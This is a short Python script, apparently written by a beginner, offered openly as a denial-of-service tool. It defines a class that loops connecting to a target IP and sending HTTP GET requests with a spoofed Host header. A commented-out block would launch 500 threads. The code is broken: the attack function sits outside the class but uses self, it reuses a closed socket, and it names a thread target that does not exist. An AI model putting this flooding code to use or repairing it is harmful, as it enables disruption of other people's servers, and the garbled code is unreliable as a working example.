import threading
import socket


class DenialOfService(object):
    def __init__(self, target="192.168.8.1", port=80, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
def attatck():
    while True:
        self.con.connect((self.target, self.port))
        self.con.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
        self.con.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
        self.con.close()


# for i in range(500):
#     thread = threading.Thread(target=ddos)
#     thread.start()

